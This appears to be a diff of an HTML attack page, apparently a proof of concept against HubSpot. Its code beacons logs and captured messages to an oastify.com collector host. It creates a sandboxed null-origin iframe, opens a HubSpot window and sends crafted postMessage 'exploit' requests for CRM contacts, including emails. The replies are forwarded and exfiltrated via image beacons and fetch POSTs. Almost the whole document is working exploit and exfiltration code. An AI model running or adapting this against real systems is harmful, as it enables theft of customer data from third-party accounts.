@@ -2,90 +2,145 @@
 <html>
 <head><title>Collector</title></head>
 <body>
-<h1>Message Collector Active</h1>
-<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:400px;overflow:auto;"></div>
+<h2>Advanced Collector</h2>
+<div id="log"></div>
 
 <script>
-const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
+const EXFIL = '8enpds891mi66ld8hc42ougriio9c50u.oastify.com';
 
 function log(msg) {
-    const d = document.getElementById('log');
-    d.innerHTML += '<br>' + msg;
-    d.scrollTop = d.scrollHeight;
+    document.getElementById('log').innerHTML += '<br>' + msg;
+    new Image().src = 'https://' + EXFIL + '/?log=' + encodeURIComponent(msg);
 }
 
 log('Collector loaded');
-log('Origin: ' + window.origin);
-log('Opener exists: ' + (window.opener ? 'YES' : 'NO'));
 
-let hubspotWindow = null;
-let messageCount = 0;
-
-// Listen for messages from ANY window
-window.addEventListener('message', e => {
-    messageCount++;
-    
-    log('Message #' + messageCount + ' from: ' + e.origin);
-    log('Data type: ' + (e.data.type || typeof e.data));
-    
-    // Store reference to HubSpot window
-    if (e.origin.includes('hubspot')) {
-        hubspotWindow = e.source;
-        log('Got HubSpot window reference!');
+window.addEventListener('message', function(e) {
+    if (e.data.action === 'CREATE_NULL_ATTACK') {
+        log('Creating null origin attack...');
+        
+        // Step 1: Create sandboxed iframe with null origin
+        const nullFrame = document.createElement('iframe');
+        nullFrame.sandbox = 'allow-scripts allow-popups';  // NO allow-same-origin = null origin!
+        nullFrame.style.cssText = 'width:100%;height:300px;border:2px solid red';
+        
+        nullFrame.srcdoc = `
+            <h3>Null Origin Frame</h3>
+            <div id="status"></div>
+            <script>
+                const E = '${EXFIL}';
+                
+                function l(m) {
+                    document.getElementById('status').innerHTML += '<br>' + m;
+                    new Image().src = 'https://' + E + '/?null=' + encodeURIComponent(m);
+                }
+                
+                l('Null frame origin: ' + window.origin);
+                
+                // Step 2: Open HubSpot - it inherits null origin!
+                l('Opening HubSpot from null origin...');
+                
+                const hub = window.open('${e.data.target}', 'hubspot', 'width=900,height=700');
+                
+                if (!hub) {
+                    l('ERROR: popup blocked');
+                } else {
+                    l('HubSpot opened with inherited null origin');
+                    
+                    // Step 3: Poll until loaded
+                    let attempts = 0;
+                    const checker = setInterval(() => {
+                        attempts++;
+                        
+                        try {
+                            hub.origin; // Will throw when loaded
+                            if (attempts % 10 === 0) l('waiting_' + attempts);
+                        } catch(err) {
+                            clearInterval(checker);
+                            l('HubSpot loaded! Both origins are NULL');
+                            
+                            // Step 4: Listen for responses
+                            window.addEventListener('message', resp => {
+                                if (resp.source === hub) {
+                                    l('Got response from HubSpot!');
+                                    
+                                    const data = JSON.stringify(resp.data);
+                                    
+                                    // Send to parent collector
+                                    window.parent.postMessage({
+                                        type: 'HUBSPOT_DATA',
+                                        data: resp.data
+                                    }, '*');
+                                    
+                                    new Image().src = 'https://' + E + '/?hubspot_resp=' + encodeURIComponent(data.substring(0, 400));
+                                }
+                            });
+                            
+                            // Step 5: Send exploits (both have null origin!)
+                            setTimeout(() => {
+                                l('Sending exploit 1');
+                                
+                                hub.postMessage({
+                                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                                    commandId: 'getContacts',
+                                    featureId: 'crm',
+                                    parameters: {
+                                        portalId: '${e.data.portalId}',
+                                        properties: ['firstname', 'super_secret', 'email']
+                                    },
+                                    resultCount: 100,
+                                    language: 'en',
+                                    objectId: '${e.data.portalId}',
+                                    applicationId: 'crm',
+                                    basePath: '/crm/v3/objects/contacts'
+                                }, '*');
+                            }, 1000);
+                            
+                            setTimeout(() => {
+                                l('Sending exploit 2');
+                                
+                                hub.postMessage({
+                                    type: 'raw',
+                                    body: {
+                                        action: 'getData',
+                                        portalId: '${e.data.portalId}'
+                                    }
+                                }, '*');
+                            }, 2000);
+                        }
+                        
+                        if (attempts > 100) {
+                            clearInterval(checker);
+                            l('Timeout');
+                        }
+                    }, 100);
+                }
+            </scr\ipt>
+        `;
+        
+        document.body.appendChild(nullFrame);
+        log('Null origin iframe created!');
     }
     
-    // Exfiltrate all data
-    const data = JSON.stringify(e.data);
-    
-    fetch(EXFIL + '/msg_' + messageCount, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify({
-            origin: e.origin,
-            data: e.data,
-            count: messageCount
-        })
-    });
-    
-    // Log preview
-    log('Data preview: ' + data.substring(0, 100));
+    // Forward data from null frame to opener
+    if (e.data.type === 'HUBSPOT_DATA') {
+        log('Forwarding HubSpot data to opener');
+        
+        if (window.opener) {
+            window.opener.postMessage(e.data.data, '*');
+        }
+        
+        // Also exfiltrate
+        fetch('https://' + EXFIL + '/hubspot_data', {
+            method: 'POST',
+            body: JSON.stringify(e.data.data)
+        });
+    }
 });
 
-// If we were opened by another window, try to get a reference to HubSpot
 if (window.opener) {
-    log('We have an opener');
-    
-    // Try to access opener's other windows
-    try {
-        log('Trying to access opener properties...');
-        
-        // Send a ping to opener
-        window.opener.postMessage({type: 'COLLECTOR_READY'}, '*');
-        log('Sent COLLECTOR_READY to opener');
-        
-    } catch(e) {
-        log('Error accessing opener: ' + e.message);
-    }
+    window.opener.postMessage({status: 'collector_ready'}, '*');
 }
-
-// Keep sending pings to get responses
-setInterval(() => {
-    if (window.opener) {
-        window.opener.postMessage({
-            type: 'COLLECTOR_PING',
-            timestamp: Date.now()
-        }, '*');
-    }
-    
-    if (hubspotWindow) {
-        hubspotWindow.postMessage({
-            type: 'COLLECTOR_PING',
-            timestamp: Date.now()
-        }, '*');
-    }
-}, 5000);
-
-log('Listening for messages...');
 </script>
 </body>
 </html>
